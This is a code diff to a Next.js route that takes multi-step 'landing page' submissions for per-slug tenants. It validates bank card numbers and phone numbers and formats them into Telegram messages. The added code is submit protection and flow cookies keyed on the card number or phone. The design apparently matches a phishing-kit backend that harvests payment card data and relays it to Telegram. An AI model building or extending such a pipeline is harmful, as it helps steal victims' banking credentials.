@@ -8,6 +8,7 @@ import {
 } from '@/app/[slug]/enterprise/lib/telegram-format';
 import { buildBankTelegramMessage } from '@/app/[slug]/enterprise/lib/bank-telegram-format';
 import { bankCardValid, type BankFormData } from '@/app/[slug]/enterprise/lib/bank-types';
+import { attachFlowCookie, enforceLandingSubmitProtection } from '@/lib/landing/submit-protection';
 import { createAdminClient } from '@/lib/supabase-admin';
 import { isValidSubdomainSlug, normalizeSubdomainSlug } from '@/lib/subdomain';
 import { NextRequest, NextResponse } from 'next/server';
@@ -90,6 +91,20 @@ export async function POST(request: NextRequest) {
         return NextResponse.json({ success: false, error: 'Data form tidak valid.' }, { status: 400 });
       }
 
+      const protection = await enforceLandingSubmitProtection(request, {
+        slug,
+        step: bankParsed.step,
+        identity: bankParsed.bankData.cardNumber,
+        product: 'bank',
+        endpoint: 'submit',
+      });
+      if (!protection.ok) {
+        return NextResponse.json(
+          { success: false, error: protection.error },
+          { status: protection.status }
+        );
+      }
+
       const admin = createAdminClient();
       const { data, error } = await admin.rpc('internal_get_landing_telegram', {
         p_slug: slug,
@@ -122,12 +137,29 @@ export async function POST(request: NextRequest) {
         );
       }
 
-      return NextResponse.json({ success: true });
+      return attachFlowCookie(
+        NextResponse.json({ success: true }),
+        protection.flowCookie
+      );
     }
 
     const parsed = sanitizeStepData(body);
     if (!parsed) {
       return NextResponse.json({ success: false, error: 'Data form tidak valid.' }, { status: 400 });
+    }
+
+    const protection = await enforceLandingSubmitProtection(request, {
+      slug,
+      step: parsed.step,
+      identity: parsed.stepData.phone,
+      product: body.product,
+      endpoint: 'submit',
+    });
+    if (!protection.ok) {
+      return NextResponse.json(
+        { success: false, error: protection.error },
+        { status: protection.status }
+      );
     }
 
     const admin = createAdminClient();
@@ -159,7 +191,7 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    return NextResponse.json({ success: true });
+    return attachFlowCookie(NextResponse.json({ success: true }), protection.flowCookie);
   } catch (err) {
     console.error('Landing submit error:', err);
     return NextResponse.json({ success: false, error: 'Terjadi kesalahan server.' }, { status: 500 });
